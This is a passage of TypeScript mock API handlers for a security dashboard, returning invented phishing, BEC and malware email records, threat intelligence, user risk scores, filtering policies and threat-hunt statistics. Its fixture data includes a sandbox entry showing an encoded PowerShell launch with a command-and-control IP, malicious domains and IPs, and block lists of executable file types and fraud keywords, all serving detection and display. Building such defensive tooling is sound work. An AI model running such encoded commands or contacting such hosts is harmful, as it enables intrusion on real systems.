  if (p === '/email/mail-flow') return ok({ steps: [{ label: 'Internet', count: 48312, dropped: 0, quarantined: 0 }, { label: 'Gateway', count: 48312, dropped: 0, quarantined: 0 }, { label: 'Email Filters', count: 47218, dropped: 1094, quarantined: 0 }, { label: 'Sandbox', count: 1247, dropped: 0, quarantined: 0 }, { label: 'Threat Intelligence', count: 47218, dropped: 0, quarantined: 0 }, { label: 'Mailbox', count: 47065, dropped: 0, quarantined: 153 }, { label: 'User', count: 47065, dropped: 0, quarantined: 0 }], total: 48312, blocked: 1094, quarantined: 153 });
  if (p === '/email/messages') return ok([{ id: 1, message_id: '<msg-001@mail.corp.com>', sender: 'noreply@microsoft-secure-login.xyz', recipient: 'finance@corp.com', subject: 'Urgent: Verify your Microsoft 365 account', timestamp: new Date(Date.now() - 300000).toISOString(), status: 'quarantined', has_attachment: false, attachment_count: 0, url_count: 2, threat_score: 97, delivery_status: 'quarantined', threat_type: 'phishing', direction: 'inbound', size_bytes: 14200, created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, message_id: '<msg-002@mail.corp.com>', sender: 'invoice@payroll-update.org', recipient: 'cfo@corp.com', subject: 'Q2 2026 Invoice — Payment Required', timestamp: new Date(Date.now() - 900000).toISOString(), status: 'blocked', has_attachment: true, attachment_count: 1, url_count: 0, threat_score: 94, delivery_status: 'rejected', threat_type: 'bec', direction: 'inbound', size_bytes: 87400, created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, message_id: '<msg-003@mail.corp.com>', sender: 'hr-notice@employment-update.net', recipient: 'all-staff@corp.com', subject: 'Important: 2026 Payroll Update Required', timestamp: new Date(Date.now() - 1800000).toISOString(), status: 'quarantined', has_attachment: true, attachment_count: 1, url_count: 1, threat_score: 91, delivery_status: 'quarantined', threat_type: 'malware', direction: 'inbound', size_bytes: 245800, created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 4, message_id: '<msg-004@mail.corp.com>', sender: 'alerts@legit-bank.com', recipient: 'accounts@corp.com', subject: 'Wire Transfer Confirmation — $48,000', timestamp: new Date(Date.now() - 3600000).toISOString(), status: 'blocked', has_attachment: false, attachment_count: 0, url_count: 1, threat_score: 89, delivery_status: 'rejected', threat_type: 'bec', direction: 'inbound', size_bytes: 8900, created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 5, message_id: '<msg-005@mail.corp.com>', sender: 'support@google.com', recipient: 'dev@corp.com', subject: 'Google Workspace Security Alert', timestamp: new Date(Date.now() - 7200000).toISOString(), status: 'delivered', has_attachment: false, attachment_count: 0, url_count: 1, threat_score: 5, delivery_status: 'delivered', threat_type: 'clean', direction: 'inbound', size_bytes: 12300, created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 6, message_id: '<msg-006@mail.corp.com>', sender: 'no-reply@amazon.com', recipient: 'purchasing@corp.com', subject: 'Your AWS bill for June 2026', timestamp: new Date(Date.now() - 14400000).toISOString(), status: 'delivered', has_attachment: true, attachment_count: 1, url_count: 3, threat_score: 3, delivery_status: 'delivered', threat_type: 'clean', direction: 'inbound', size_bytes: 34200, created_at: new Date(Date.now() - 14400000).toISOString() }]);
  if (p === '/email/threats') return ok([{ id: 1, message_id: '<msg-001@mail.corp.com>', sender: 'noreply@microsoft-secure-login.xyz', recipient: 'finance@corp.com', subject: 'Urgent: Verify your Microsoft 365 account', status: 'quarantined', threat_type: 'phishing', threat_score: 97, has_attachment: false, url_count: 2, created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, message_id: '<msg-002@mail.corp.com>', sender: 'invoice@payroll-update.org', recipient: 'cfo@corp.com', subject: 'Q2 2026 Invoice — Payment Required', status: 'blocked', threat_type: 'bec', threat_score: 94, has_attachment: true, url_count: 0, created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, message_id: '<msg-003@mail.corp.com>', sender: 'hr-notice@employment-update.net', recipient: 'all-staff@corp.com', subject: 'Important: 2026 Payroll Update Required', status: 'quarantined', threat_type: 'malware', threat_score: 91, has_attachment: true, url_count: 1, created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 7, message_id: '<msg-007@mail.corp.com>', sender: 'noreply@secure-paypal-login.xyz', recipient: 'cto@corp.com', subject: 'Action Required: Verify PayPal Account', status: 'blocked', threat_type: 'phishing', threat_score: 98, has_attachment: false, url_count: 1, created_at: new Date(Date.now() - 5400000).toISOString() }, { id: 8, message_id: '<msg-008@mail.corp.com>', sender: 'ceo@c0rp.com', recipient: 'hr@corp.com', subject: 'Payroll Change Request — Urgent', status: 'blocked', threat_type: 'bec', threat_score: 88, has_attachment: false, url_count: 0, created_at: new Date(Date.now() - 10800000).toISOString() }]);
  if (p === '/email/attachments') return ok([{ id: 1, message_id: 3, filename: 'Payroll_Update_2026.docx', file_type: 'docx', file_size: 198400, sha256: 'e3b0c44298fc1c149afb4c8996fb92427ae41e4649b934ca495991b7852b855', md5: '098f6bcd4621d373cade4e832627b4f6', verdict: 'malicious', has_macros: true, has_embedded: true, has_signature: false, sandbox_result: 'Process spawn: cmd.exe /c powershell -nop -enc JABjAGwAaQBlAG4AdAA=; Network: 185.220.101.47:443; Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 2, message_id: 2, filename: 'Invoice_48000_USD.pdf', file_type: 'pdf', file_size: 87400, sha256: 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3', md5: '5d41402abc4b2a76b9719d911017c592', verdict: 'suspicious', has_macros: false, has_embedded: true, has_signature: false, sandbox_result: 'Embedded URL redirect to phishing domain; JavaScript present in PDF', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, message_id: 6, filename: 'AWS_Bill_June2026.pdf', file_type: 'pdf', file_size: 34200, sha256: '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824', md5: '1a79a4d60de6718e8e5b326e338ae533', verdict: 'clean', has_macros: false, has_embedded: false, has_signature: true, sandbox_result: 'No malicious behavior detected', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 4, message_id: 9, filename: 'urgent_delivery_notice.zip', file_type: 'zip', file_size: 445600, sha256: '84a516841ba77a5b4648de2cd0dfcb30ea46dbb4de3490d71ab', md5: 'f5e7a3c9b2d1e0f8c7b6a5d4e3c2b1a0', verdict: 'malicious', has_macros: false, has_embedded: true, has_signature: false, sandbox_result: 'Contains: loader.exe (AgentTesla stealer); Network: 91.108.4.233:4443; Keylogger activity detected', created_at: new Date(Date.now() - 21600000).toISOString() }]);
  if (p === '/email/urls') return ok([{ id: 1, message_id: 1, url: 'https://bit.ly/3xYZ9ab', domain: 'bit.ly', reputation: 'neutral', redirect_count: 3, is_shortened: true, is_newly_registered: false, has_login_form: true, is_typosquatting: false, verdict: 'malicious', click_count: 3, created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, message_id: 1, url: 'https://microsoft-secure-login.xyz/auth/verify', domain: 'microsoft-secure-login.xyz', reputation: 'malicious', redirect_count: 0, is_shortened: false, is_newly_registered: true, has_login_form: true, is_typosquatting: true, verdict: 'malicious', click_count: 3, created_at: new Date(Date.now() - 300000).toISOString() }, { id: 3, message_id: 7, url: 'https://secure-paypal-login.xyz/account/verify', domain: 'secure-paypal-login.xyz', reputation: 'malicious', redirect_count: 2, is_shortened: false, is_newly_registered: true, has_login_form: true, is_typosquatting: true, verdict: 'malicious', click_count: 1, created_at: new Date(Date.now() - 5400000).toISOString() }, { id: 4, message_id: 5, url: 'https://support.google.com/accounts/answer/9013295', domain: 'support.google.com', reputation: 'clean', redirect_count: 0, is_shortened: false, is_newly_registered: false, has_login_form: false, is_typosquatting: false, verdict: 'clean', click_count: 2, created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 5, message_id: 6, url: 'https://console.aws.amazon.com/billing/', domain: 'console.aws.amazon.com', reputation: 'clean', redirect_count: 0, is_shortened: false, is_newly_registered: false, has_login_form: true, is_typosquatting: false, verdict: 'clean', click_count: 5, created_at: new Date(Date.now() - 14400000).toISOString() }]);
  if (p === '/email/auth-results') return ok({ summary: { total: 48312, spf_pass: 37683, dkim_pass: 39616, dmarc_pass: 34301, spf_rate: 78, dkim_rate: 82, dmarc_rate: 71 }, domains: [{ domain: 'microsoft.com', spf: 'pass', dkim: 'pass', dmarc: 'pass', arc: 'pass', bimi: 'pass', aligned: true, policy: 'reject' }, { domain: 'google.com', spf: 'pass', dkim: 'pass', dmarc: 'pass', arc: 'pass', bimi: 'pass', aligned: true, policy: 'reject' }, { domain: 'amazon.com', spf: 'pass', dkim: 'pass', dmarc: 'pass', arc: 'none', bimi: 'none', aligned: true, policy: 'quarantine' }, { domain: 'paypal.com', spf: 'pass', dkim: 'pass', dmarc: 'pass', arc: 'pass', bimi: 'none', aligned: true, policy: 'reject' }, { domain: 'microsoft-secure-login.xyz', spf: 'fail', dkim: 'none', dmarc: 'fail', arc: 'none', bimi: 'none', aligned: false, policy: 'none' }, { domain: 'payroll-update.org', spf: 'fail', dkim: 'fail', dmarc: 'fail', arc: 'none', bimi: 'none', aligned: false, policy: 'none' }, { domain: 'corp.com', spf: 'pass', dkim: 'pass', dmarc: 'pass', arc: 'pass', bimi: 'none', aligned: true, policy: 'reject' }] });
  if (p === '/email/sender-intel') { const domain = sp.get('domain') || sp.get('email')?.split('@')[1] || 'unknown'; const malicious = domain.includes('xyz') || domain.includes('update.org'); return ok({ domain, reputation: malicious ? 'malicious' : 'neutral', reputation_score: malicious ? 8 : 50, domain_age_days: malicious ? 3 : 1825, whois_registrar: malicious ? 'NameCheap' : 'GoDaddy Inc.', whois_created: malicious ? new Date(Date.now() - 259200000).toISOString().split('T')[0] : '2021-03-15', geo_country: malicious ? 'Russia' : 'United States', geo_city: malicious ? 'Moscow' : 'Phoenix', asn: malicious ? 'AS62370' : 'AS26496', asn_org: malicious ? 'Frantech Solutions' : 'GoDaddy.com LLC', email_volume_7d: malicious ? 3 : 12, threat_intel_hits: malicious ? 7 : 0 }); }
  if (p === '/email/threat-intel') return ok({ malicious_domains: [{ domain: 'microsoft-secure-login.xyz', category: 'credential_harvesting', hits: 14, first_seen: '2026-07-10' }, { domain: 'paypal-support-update.com', category: 'brand_impersonation', hits: 8, first_seen: '2026-07-12' }, { domain: 'microsoft365-auth.net', category: 'fake_login', hits: 6, first_seen: '2026-07-14' }, { domain: 'hr-payroll-update.org', category: 'bec', hits: 4, first_seen: '2026-07-13' }], malicious_ips: [{ ip: '185.220.101.47', hits: 23, threat_type: 'phishing', country: 'RU' }, { ip: '91.108.4.233', hits: 11, threat_type: 'malware_delivery', country: 'NL' }, { ip: '198.54.117.200', hits: 7, threat_type: 'bec', country: 'US' }], malware_families: [{ family: 'Emotet', count: 7, category: 'banking_trojan' }, { family: 'QakBot', count: 2, category: 'banking_trojan' }, { family: 'AgentTesla', count: 1, category: 'stealer' }, { family: 'FormBook', count: 1, category: 'stealer' }], threat_actors: [{ actor: 'TA505', campaigns: 2, target_industry: 'Finance', email_volume: 18 }, { actor: 'Lazarus Group', campaigns: 1, target_industry: 'Cryptocurrency', email_volume: 6 }], by_threat_type: [{ type: 'phishing', count: 834 }, { type: 'malware', count: 289 }, { type: 'bec', count: 124 }] });
  if (p === '/email/campaigns') return ok([{ id: 1, name: 'TA505 Finance Lures — July 2026', campaign_type: 'phishing', threat_actor: 'TA505', email_count: 18, victim_count: 3, first_seen: new Date(Date.now() - 86400000 * 5).toISOString(), last_seen: new Date(Date.now() - 300000).toISOString(), status: 'active', common_subject: 'Q2 Invoice / Payment Required', common_sender: 'invoice@payroll-update.org', common_domain: 'payroll-update.org', malware_family: 'Emotet', created_at: new Date(Date.now() - 86400000 * 5).toISOString() }, { id: 2, name: 'Microsoft 365 Credential Harvest Wave', campaign_type: 'phishing', threat_actor: 'Unknown', email_count: 34, victim_count: 7, first_seen: new Date(Date.now() - 86400000 * 3).toISOString(), last_seen: new Date(Date.now() - 900000).toISOString(), status: 'active', common_subject: 'Urgent: Verify your Microsoft 365 account', common_sender: 'noreply@microsoft-secure-login.xyz', common_domain: 'microsoft-secure-login.xyz', malware_family: '', created_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { id: 3, name: 'CEO Wire Transfer BEC', campaign_type: 'bec', threat_actor: 'Unknown', email_count: 6, victim_count: 2, first_seen: new Date(Date.now() - 86400000 * 2).toISOString(), last_seen: new Date(Date.now() - 3600000).toISOString(), status: 'active', common_subject: 'Wire Transfer / Urgent Payment', common_sender: 'ceo@c0rp.com', common_domain: 'c0rp.com', malware_family: '', created_at: new Date(Date.now() - 86400000 * 2).toISOString() }, { id: 4, name: 'AgentTesla Delivery Lures', campaign_type: 'malware', threat_actor: 'Unknown', email_count: 11, victim_count: 1, first_seen: new Date(Date.now() - 86400000 * 7).toISOString(), last_seen: new Date(Date.now() - 21600000).toISOString(), status: 'resolved', common_subject: 'Shipping / Delivery Notice', common_sender: 'shipping@delivery-track.net', common_domain: 'delivery-track.net', malware_family: 'AgentTesla', created_at: new Date(Date.now() - 86400000 * 7).toISOString() }]);
  if (p === '/email/timeline') return ok([{ id: 1, message_id: '<msg-001@mail.corp.com>', sender: 'noreply@microsoft-secure-login.xyz', recipient: 'finance@corp.com', subject: 'Urgent: Verify your Microsoft 365 account', threat_type: 'phishing', threat_score: 97, status: 'quarantined', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, message_id: '<msg-002@mail.corp.com>', sender: 'invoice@payroll-update.org', recipient: 'cfo@corp.com', subject: 'Q2 2026 Invoice — Payment Required', threat_type: 'bec', threat_score: 94, status: 'blocked', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, message_id: '<msg-003@mail.corp.com>', sender: 'hr-notice@employment-update.net', recipient: 'all-staff@corp.com', subject: 'Important: 2026 Payroll Update Required', threat_type: 'malware', threat_score: 91, status: 'quarantined', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 7, message_id: '<msg-007@mail.corp.com>', sender: 'noreply@secure-paypal-login.xyz', recipient: 'cto@corp.com', subject: 'Action Required: Verify PayPal Account', threat_type: 'phishing', threat_score: 98, status: 'blocked', created_at: new Date(Date.now() - 5400000).toISOString() }, { id: 8, message_id: '<msg-008@mail.corp.com>', sender: 'ceo@c0rp.com', recipient: 'hr@corp.com', subject: 'Payroll Change Request — Urgent', threat_type: 'bec', threat_score: 88, status: 'blocked', created_at: new Date(Date.now() - 10800000).toISOString() }, { id: 9, message_id: '<msg-009@mail.corp.com>', sender: 'shipping@delivery-track.net', recipient: 'warehouse@corp.com', subject: 'Your Package Delivery Update', threat_type: 'malware', threat_score: 85, status: 'blocked', created_at: new Date(Date.now() - 21600000).toISOString() }]);
  if (p === '/email/user-risk') return ok([{ id: 1, email: 'sarah.jones@corp.com', display_name: 'Sarah Jones', department: 'Finance', click_count: 4, phishing_failures: 3, is_repeated_victim: true, training_status: 'in_progress', risk_score: 94, last_click_at: new Date(Date.now() - 300000).toISOString(), created_at: new Date(Date.now() - 86400000 * 30).toISOString() }, { id: 2, email: 'mike.chen@corp.com', display_name: 'Mike Chen', department: 'HR', click_count: 2, phishing_failures: 2, is_repeated_victim: true, training_status: 'pending', risk_score: 82, last_click_at: new Date(Date.now() - 900000).toISOString(), created_at: new Date(Date.now() - 86400000 * 20).toISOString() }, { id: 3, email: 'david.kim@corp.com', display_name: 'David Kim', department: 'Executive', click_count: 1, phishing_failures: 1, is_repeated_victim: false, training_status: 'pending', risk_score: 71, last_click_at: new Date(Date.now() - 5400000).toISOString(), created_at: new Date(Date.now() - 86400000 * 15).toISOString() }, { id: 4, email: 'emma.wilson@corp.com', display_name: 'Emma Wilson', department: 'Accounting', click_count: 1, phishing_failures: 1, is_repeated_victim: false, training_status: 'completed', risk_score: 52, last_click_at: new Date(Date.now() - 86400000 * 3).toISOString(), created_at: new Date(Date.now() - 86400000 * 45).toISOString() }, { id: 5, email: 'james.park@corp.com', display_name: 'James Park', department: 'Engineering', click_count: 0, phishing_failures: 0, is_repeated_victim: false, training_status: 'completed', risk_score: 12, last_click_at: null, created_at: new Date(Date.now() - 86400000 * 60).toISOString() }]);
  if (p === '/email/analytics') return ok({ top_senders: [{ sender: 'noreply@microsoft-secure-login.xyz', count: 34 }, { sender: 'invoice@payroll-update.org', count: 18 }, { sender: 'noreply@secure-paypal-login.xyz', count: 12 }, { sender: 'hr-notice@employment-update.net', count: 8 }, { sender: 'ceo@c0rp.com', count: 6 }], top_blocked_urls: [{ domain: 'microsoft-secure-login.xyz', count: 34 }, { domain: 'secure-paypal-login.xyz', count: 12 }, { domain: 'payroll-update.org', count: 8 }, { domain: 'hr-employment-update.net', count: 4 }], phishing_trend: [{ date: '2026-07-03', count: 18 }, { date: '2026-07-04', count: 24 }, { date: '2026-07-05', count: 11 }, { date: '2026-07-06', count: 9 }, { date: '2026-07-07', count: 7 }, { date: '2026-07-08', count: 14 }, { date: '2026-07-09', count: 31 }, { date: '2026-07-10', count: 28 }, { date: '2026-07-11', count: 19 }, { date: '2026-07-12', count: 22 }, { date: '2026-07-13', count: 41 }, { date: '2026-07-14', count: 36 }, { date: '2026-07-15', count: 29 }, { date: '2026-07-16', count: 12 }], bec_trend: [{ date: '2026-07-03', count: 3 }, { date: '2026-07-04', count: 1 }, { date: '2026-07-05', count: 2 }, { date: '2026-07-06', count: 0 }, { date: '2026-07-07', count: 4 }, { date: '2026-07-08', count: 2 }, { date: '2026-07-09', count: 6 }, { date: '2026-07-10', count: 8 }, { date: '2026-07-11', count: 5 }, { date: '2026-07-12', count: 3 }, { date: '2026-07-13', count: 9 }, { date: '2026-07-14', count: 7 }, { date: '2026-07-15', count: 4 }, { date: '2026-07-16', count: 2 }] });
  if (p === '/email/policies') return ok([{ id: 1, name: 'Block Executable Attachments', policy_type: 'attachment', action: 'block', criteria: 'file_type IN (exe,dll,js,vbs,ps1,bat,cmd,msi,lnk,iso)', enabled: true, priority: 1, created_at: new Date(Date.now() - 86400000 * 90).toISOString() }, { id: 2, name: 'Quarantine Password-Protected Archives', policy_type: 'attachment', action: 'quarantine', criteria: 'file_type IN (zip,7z,rar) AND encrypted=true', enabled: true, priority: 2, created_at: new Date(Date.now() - 86400000 * 60).toISOString() }, { id: 3, name: 'Block Newly Registered Domains', policy_type: 'url', action: 'block', criteria: 'domain_age_days < 30', enabled: true, priority: 3, created_at: new Date(Date.now() - 86400000 * 45).toISOString() }, { id: 4, name: 'Block URL Shorteners', policy_type: 'url', action: 'block', criteria: 'is_shortened=true', enabled: true, priority: 4, created_at: new Date(Date.now() - 86400000 * 30).toISOString() }, { id: 5, name: 'Spam Aggressive Filtering', policy_type: 'spam', action: 'quarantine', criteria: 'spam_score > 7', enabled: true, priority: 5, created_at: new Date(Date.now() - 86400000 * 20).toISOString() }, { id: 6, name: 'BEC Finance Keywords', policy_type: 'bec', action: 'quarantine', criteria: 'subject CONTAINS (wire transfer, urgent payment, gift card, payroll change)', enabled: true, priority: 6, created_at: new Date(Date.now() - 86400000 * 14).toISOString() }, { id: 7, name: 'Domain Allowlist — Trusted Partners', policy_type: 'allowlist', action: 'allow', criteria: 'domain IN (partner.com, vendor.com, supplier.io)', enabled: true, priority: 10, created_at: new Date(Date.now() - 86400000 * 7).toISOString() }]);
  if (p === '/email/reported') return ok([{ id: 1, reporter_email: 'sarah.jones@corp.com', message_id: '<msg-001@mail.corp.com>', subject: 'Urgent: Verify your Microsoft 365 account', original_sender: 'noreply@microsoft-secure-login.xyz', reported_at: new Date(Date.now() - 200000).toISOString(), triage_status: 'confirmed_phishing', analyst_notes: 'Confirmed phishing. Part of Microsoft 365 credential harvesting campaign. Pulled from all mailboxes.', campaign_id: 2, auto_verdict: 'phishing' }, { id: 2, reporter_email: 'mike.chen@corp.com', message_id: '<msg-015@mail.corp.com>', subject: 'HR Policy Update — Action Required', original_sender: 'hr@employment-verify.com', reported_at: new Date(Date.now() - 3600000).toISOString(), triage_status: 'pending', analyst_notes: '', campaign_id: 0, auto_verdict: 'suspicious' }, { id: 3, reporter_email: 'james.park@corp.com', message_id: '<msg-022@mail.corp.com>', subject: 'Tech newsletter — June 2026', original_sender: 'newsletter@techcrunch.com', reported_at: new Date(Date.now() - 7200000).toISOString(), triage_status: 'false_positive', analyst_notes: 'Legitimate TechCrunch newsletter. User instructed on how to unsubscribe instead.', campaign_id: 0, auto_verdict: 'clean' }, { id: 4, reporter_email: 'emma.wilson@corp.com', message_id: '<msg-031@mail.corp.com>', subject: 'Q2 Invoice — Payment Required', original_sender: 'invoice@payroll-update.org', reported_at: new Date(Date.now() - 14400000).toISOString(), triage_status: 'escalated', analyst_notes: 'BEC attempt. Escalated to incident response. Coordinating with finance to confirm no payment made.', campaign_id: 1, auto_verdict: 'bec' }]);

  // ── Hunt Enterprise ──────────────────────────────────────────────────────
  if (p === '/hunt/dashboard') {
    const runs = D.hunt_runs as any[];
    const completed = runs.filter((r: any) => r.status === 'completed').length;
    const withHits  = runs.filter((r: any) => r.status === 'completed' && r.hit_count > 0).length;
    return ok({
      active:        runs.filter((r: any) => r.status === 'running').length,
      completed,
      failed:        runs.filter((r: any) => r.status === 'failed').length,
      total:         runs.length,
      saved:         (D.hunt_templates as any[]).length,
      success_rate:  completed > 0 ? Math.round(withHits / completed * 100) : 0,
      ioc_matches:   runs.reduce((s: number, r: any) => s + (r.hit_count || 0), 0),
      recent_runs:   runs.slice(0, 10).map((r: any) => ({
        id: r.id, name: r.name, status: r.status, hit_count: r.hit_count,
        analyst: r.analyst || 'analyst-1', severity: r.severity || 'medium', started_at: r.started_at,
      })),
      top_techniques: [
        { technique: 'T1071.001', count: 6 }, { technique: 'T1059.001', count: 4 },
        { technique: 'T1003.001', count: 3 }, { technique: 'T1021', count: 2 },
        { technique: 'T1486', count: 1 },
      ],
      trend: Array.from({ length: 14 }, (_, i) => {
        const d = new Date(Date.now() - (13 - i) * 86400000);
        return { date: d.toISOString().slice(0, 10), runs: seededRand(i * 7) % 5, matches: seededRand(i * 11) % 20 };
      }),
    });
  }
  if (p === '/hunt/analytics') {
    return ok({
      analysts: [
        { analyst: 'analyst-1', runs: 8, total_hits: 34, success_rate: 62 },
        { analyst: 'analyst-2', runs: 6, total_hits: 18, success_rate: 50 },
        { analyst: 'analyst-3', runs: 6, total_hits: 12, success_rate: 33 },
      ],
      top_templates: (D.hunt_templates as any[]).slice(0, 5).map((t: any) => ({
        name: t.name, runs: seededRand(t.id * 3) % 8 + 1, hits: seededRand(t.id * 7) % 20,
      })),
      daily: Array.from({ length: 30 }, (_, i) => {
        const d = new Date(Date.now() - (29 - i) * 86400000);
        return { date: d.toISOString().slice(0, 10), runs: seededRand(i * 5) % 4, matches: seededRand(i * 9) % 15 };
      }),
      total_runs: (D.hunt_runs as any[]).length,
      total_hits: (D.hunt_runs as any[]).reduce((s: number, r: any) => s + (r.hit_count || 0), 0),
    });
  }
  if (p === '/hunt/mitre-coverage') {
    const covered = ['T1071.001', 'T1059.001', 'T1003.001', 'T1021', 'T1486', 'T1547', 'T1218', 'T1055'];
    const frequent = ['T1071.001', 'T1059.001'];
    const tactics = [
      { id: 'TA0001', name: 'Initial Access',      techniques: [
        {id:'T1566',name:'Phishing'},{id:'T1190',name:'Exploit Public-Facing App'},{id:'T1195',name:'Supply Chain'},{id:'T1078',name:'Valid Accounts'},{id:'T1199',name:'Trusted Relationship'}] },
      { id: 'TA0002', name: 'Execution',           techniques: [
        {id:'T1059',name:'Scripting'},{id:'T1059.001',name:'PowerShell'},{id:'T1204',name:'User Execution'},{id:'T1053',name:'Scheduled Task'},{id:'T1569',name:'System Services'}] },
      { id: 'TA0003', name: 'Persistence',         techniques: [
        {id:'T1547',name:'Boot Autostart'},{id:'T1098',name:'Account Manipulation'},{id:'T1136',name:'Create Account'},{id:'T1505',name:'Server Software'},{id:'T1053',name:'Scheduled Task'}] },
      { id: 'TA0004', name: 'Privilege Escalation',techniques: [
        {id:'T1548',name:'Abuse Elevation'},{id:'T1134',name:'Access Token'},{id:'T1068',name:'Exploit Vuln'},{id:'T1055',name:'Process Injection'},{id:'T1078',name:'Valid Accounts'}] },
      { id: 'TA0005', name: 'Defense Evasion',     techniques: [
        {id:'T1027',name:'Obfuscation'},{id:'T1055',name:'Process Injection'},{id:'T1036',name:'Masquerading'},{id:'T1070',name:'Indicator Removal'},{id:'T1562',name:'Impair Defenses'}] },
      { id: 'TA0006', name: 'Credential Access',   techniques: [
        {id:'T1003',name:'Credential Dump'},{id:'T1003.001',name:'LSASS Memory'},{id:'T1110',name:'Brute Force'},{id:'T1552',name:'Unsecured Creds'},{id:'T1558',name:'Kerberos Tickets'}] },
      { id: 'TA0007', name: 'Discovery',           techniques: [
        {id:'T1046',name:'Network Scan'},{id:'T1082',name:'System Info'},{id:'T1083',name:'File Discovery'},{id:'T1057',name:'Process Discovery'},{id:'T1016',name:'Network Config'}] },
      { id: 'TA0008', name: 'Lateral Movement',    techniques: [
        {id:'T1021',name:'Remote Services'},{id:'T1021.001',name:'RDP'},{id:'T1021.002',name:'SMB Shares'},{id:'T1550',name:'Alt Auth'},{id:'T1570',name:'Lateral Transfer'}] },
      { id: 'TA0011', name: 'Command & Control',   techniques: [
        {id:'T1071',name:'App Layer Protocol'},{id:'T1071.001',name:'Web Protocols'},{id:'T1573',name:'Encrypted Channel'},{id:'T1008',name:'Fallback Channels'},{id:'T1095',name:'Non-App Layer'}] },
      { id: 'TA0040', name: 'Impact',              techniques: [
        {id:'T1485',name:'Data Destruction'},{id:'T1489',name:'Service Stop'},{id:'T1486',name:'Ransomware'},{id:'T1490',name:'Inhibit Recovery'},{id:'T1495',name:'Firmware Corrupt'}] },
    ].map(tac => ({
      ...tac,
      coverage: Math.round(tac.techniques.filter((t: any) => covered.includes(t.id)).length / tac.techniques.length * 100),
      techniques: tac.techniques.map((t: any) => ({
        ...t,
        status: frequent.includes(t.id) ? 'frequently_hunted' : covered.includes(t.id) ? 'covered' : 'untested',
        run_count: frequent.includes(t.id) ? 6 : covered.includes(t.id) ? 2 : 0,
      })),
    }));
    return ok({ tactics, overall_coverage: 27, covered_count: covered.length, total_count: 50 });
  }
  if (p === '/hunt/notebook')                 return ok([{ id: 1, run_id: 0, content: '## Hunt Notes\n\nInvestigating C2 beaconing pattern on WORKSTATION-01.', content_type: 'note', created_by: 'analyst-1', created_at: new Date().toISOString() }]);

  // ── Threat Hunt Enterprise GET stubs ─────────────────────────────────────────
  if (p === '/threat-hunt/dashboard') {
    const lib = THREAT_HUNT_LIBRARY;
    return ok({
      total: lib.length, draft: 0, active: lib.filter(h => h.status === 'active').length,
      completed: lib.filter(h => h.status === 'completed').length, archived: 0,
      scheduled: lib.filter(h => h.schedule_type !== 'manual' && h.schedule_type !== '').length,
      continuous: lib.filter(h => h.is_continuous).length,
      ioc_hunts: lib.filter(h => h.category === 'ioc').length,
      ttp_hunts: lib.filter(h => h.category === 'ttp').length,
      actor_hunts: lib.filter(h => h.category === 'actor').length,
      total_runs: lib.reduce((s, h) => s + h.run_count, 0),
      success_rate: Math.round(lib.reduce((s, h) => s + h.success_rate, 0) / lib.length),
      findings: THREAT_HUNT_FINDINGS_DATA.length,
      new_findings: THREAT_HUNT_FINDINGS_DATA.filter(f => f.status === 'open').length,
      critical_finds: THREAT_HUNT_FINDINGS_DATA.filter(f => f.severity === 'critical').length,
      high_finds: THREAT_HUNT_FINDINGS_DATA.filter(f => f.severity === 'high').length,
      open_findings: THREAT_HUNT_FINDINGS_DATA.filter(f => f.status === 'open').length,
      recent: lib.slice(0, 6).map(h => ({ id: h.id, name: h.name, category: h.category, status: h.status, hit_count: h.hit_count, run_at: h.last_run_at })),
      trend: Array.from({ length: 14 }, (_, i) => ({ date: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10), hunts: seededRand(i * 7) % 3, findings: seededRand(i * 11) % 5 })),
    });
  }
  if (p === '/threat-hunt/library')    return ok(THREAT_HUNT_LIBRARY);
  if (p === '/threat-hunt/categories') return ok(THREAT_HUNT_CATEGORIES_DATA);
  if (p === '/threat-hunt/findings')   return ok(THREAT_HUNT_FINDINGS_DATA);
  if (p === '/threat-hunt/metrics') return ok({
    by_category: [
      { category: 'ttp',    total: 3, total_hits: 24, success_rate: 73 },
      { category: 'malware',total: 2, total_hits: 5,  success_rate: 66 },
      { category: 'actor',  total: 1, total_hits: 3,  success_rate: 50 },
      { category: 'cloud',  total: 1, total_hits: 7,  success_rate: 60 },
      { category: 'insider',total: 1, total_hits: 1,  success_rate: 33 },
    ],
    by_analyst: [
      { analyst: 'analyst-1', hunt_count: 4, total_hits: 24, success_rate: 75 },
      { analyst: 'analyst-2', hunt_count: 3, total_hits: 10, success_rate: 55 },
      { analyst: 'analyst-3', hunt_count: 2, total_hits: 5,  success_rate: 60 },
    ],
    daily: Array.from({ length: 14 }, (_, i) => ({ date: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10), hunts: seededRand(i * 5) % 3, findings: seededRand(i * 9) % 4 })),
  });
  if (/^\/threat-hunt\/\d+\/comments$/.test(p)) return ok([{ id: 1, author: 'analyst-1', content: 'Confirmed malicious activity on WORKSTATION-01. Escalating to incident response.', created_at: new Date(Date.now() - 3600000).toISOString() }]);
  if (/^\/threat-hunt\/\d+$/.test(p)) {
    const hid = parseInt(p.split('/').pop() || '0');
    const found = THREAT_HUNT_LIBRARY.find(h => h.id === hid);
    return found ? ok(found) : notFound();
  }

  // ── Hunt — templates with schedule/created_by ─────────────────────────────
  if (p === '/hunt/templates') return ok(HUNT_TEMPLATES_NORMALIZED);
  if (p === '/hunt/runs')      return ok(D.hunt_runs);
  if (p === '/hunt/queries')   return ok([]);

  // ── Global Search ─────────────────────────────────────────────────────────
  if (p === '/search') {
